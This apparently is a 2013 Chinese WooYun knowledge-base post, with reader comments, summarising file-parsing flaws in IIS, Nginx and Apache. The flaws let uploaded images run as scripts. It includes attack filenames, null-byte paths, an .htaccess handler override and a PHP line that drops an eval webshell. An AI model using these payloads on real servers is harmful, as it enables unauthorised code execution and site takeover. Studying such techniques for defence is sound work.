<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">解析漏洞总结</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">erevus</a> <span class="bull">·</span> <time title="2013/09/02 11:25" ui-time="" datetime="2013/09/02 11:25" class="published ng-binding ng-isolate-scope">2013/09/02 11:25</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>一、IIS 5.x/6.0解析漏洞</h2><hr><p>IIS 6.0解析利用方法有两种</p><p>1.目录解析</p><pre><code>/xx.asp/xx.jpg
</code></pre><p>2.文件解析</p><pre><code>wooyun.asp;.jpg 
</code></pre><p>第一种，在网站下建立文件夹的名字为 <em>.asp、</em>.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p><p>例如创建目录 wooyun.asp，那么</p><pre><code>/wooyun.asp/1.jpg
</code></pre><p>将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。</p><p>第二种，在IIS6.0下，分号后面的不被解析，也就是说</p><pre><code>wooyun.asp;.jpg
</code></pre><p>会被服务器看成是wooyun.asp</p><p>还有IIS6.0 默认的可执行文件除了asp还包含这三种</p><pre><code>/wooyun.asa
/wooyun.cer
/wooyun.cdx
</code></pre><p>乌云上的IIS 6.0解析漏洞利用案例</p><p><a href="http://www.wooyun.org/searchbug.php?q=IIS6.0">http://www.wooyun.org/searchbug.php?q=IIS6.0</a></p><h2>二、IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞</h2><hr><p>Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…</p><p>在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为</p><pre><code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[cmd])?&gt;');?&gt;
</code></pre><p>的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php</p><p>这个漏洞案例</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-032250">WooYun: 用友软件某分站SQL注入漏洞+nginx解析漏洞</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-021064">WooYun: 新浪网分站多处安全漏洞（nginx解析+SQL注射等）小礼包</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-019253">WooYun: kingsoft.com某x级域名nginx解析漏洞+爆路径</a></p><h2>三、Nginx &lt;8.03 空字节代码执行漏洞</h2><hr><p>影响版:0.5.<em>,0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p><p>Nginx在图片中嵌入PHP代码然后通过访问</p><pre><code>xxx.jpg%00.php
</code></pre><p>来执行其中的代码</p><p>Nginx 空字节代执行漏洞案例</p><p><a href="http://www.wooyun.org/searchbug.php?q=%2500.php">http://www.wooyun.org/searchbug.php?q=%2500.php</a></p><h2>四、Apache解析漏洞</h2><hr><p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p><p>比如 wooyun.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php.</p><p>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀</p><p>Apache解析漏洞案例</p><p><a href="http://www.wooyun.org/searchbug.php?q=apache%E8%A7%A3%E6%9E%90">http://www.wooyun.org/searchbug.php?q=apache%E8%A7%A3%E6%9E%90</a></p><h2>五、其他</h2><hr><p>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</p><p>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:</p><pre><code>&lt;FilesMatch "wooyun.jpg"&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;
</code></pre><p>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/345" rel="bookmark" id="re1">在线支付逻辑漏洞总结</a></li><li><a href="http://drops.wooyun.org/papers/346" rel="bookmark" id="re2">终端机的安全性</a></li><li><a href="http://drops.wooyun.org/papers/410" rel="bookmark" id="re3">从乌云看运维安全那点事儿</a></li><li><a href="http://drops.wooyun.org/web/3295" rel="bookmark" id="re4">密码找回功能可能存在的问题（补充）</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">立志成为厨神的男人</span> <span class="reply-time">2016-06-03 21:42:53</span></div><p></p><p>不知道现在还有出来其他解析漏洞吗 这些都流传比较广了 求老司机写续集</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">alert("xss")</span> <span class="reply-time">2016-05-12 23:58:18</span></div><p></p><p>@昌维</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2016-01-21 23:33:50</span></div><p></p><p>这个总结的很全面，谢谢大牛分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">backda0</span> <span class="reply-time">2015-09-28 10:25:38</span></div><p></p><p>啊哟，这个屌</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">demo</span> <span class="reply-time">2015-09-24 10:17:51</span></div><p></p><p>&lt;FilesMatch &quot;wooyun.jpg&quot;&gt; 这里写匹配的文件是wooyun.jpg</p><p>上传也是上传wooyun.jpg , 而不是shell.jpg ， 笔误了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">昌维</span> <span class="reply-time">2015-05-05 17:26:50</span></div><p></p><p>最后一个长见识了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">啊L川</span> <span class="reply-time">2015-03-24 21:15:54</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">paidir</span> <span class="reply-time">2015-01-29 14:44:17</span></div><p></p><p>学习了，总结的很好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">风花雪月</span> <span class="reply-time">2015-01-12 03:16:14</span></div><p></p><p>这些都知道，但是我想问 在 IIS8.0之中 该怎么办呢？刚才遇到这个问题，百度来乌云鸟！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">springold</span> <span class="reply-time">2013-09-17 10:05:24</span></div><p></p><p>写得不错。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Spongebob</span> <span class="reply-time">2013-09-10 10:45:36</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">法海</span> <span class="reply-time">2013-09-07 18:23:47</span></div><p></p><p>如果有写补救办法就更好了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SunnyJay</span> <span class="reply-time">2013-09-05 10:58:23</span></div><p></p><p>求续集</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">龙臣</span> <span class="reply-time">2013-09-04 22:44:41</span></div><p></p><p>很全面的说</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Kavia</span> <span class="reply-time">2013-09-04 22:35:00</span></div><p></p><p>求补充</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-09-03 11:20:45</span></div><p></p><p>要是能够将更深层次的webserver处理请求的机制讲讲就更好啦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">big、face</span> <span class="reply-time">2013-09-02 21:33:52</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大师哥</span> <span class="reply-time">2013-09-02 17:02:38</span></div><p></p><p>写的很不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2013-09-02 12:44:48</span></div><p></p><p>不错，支持下。</p><p></p></div></div></div></div></div></main>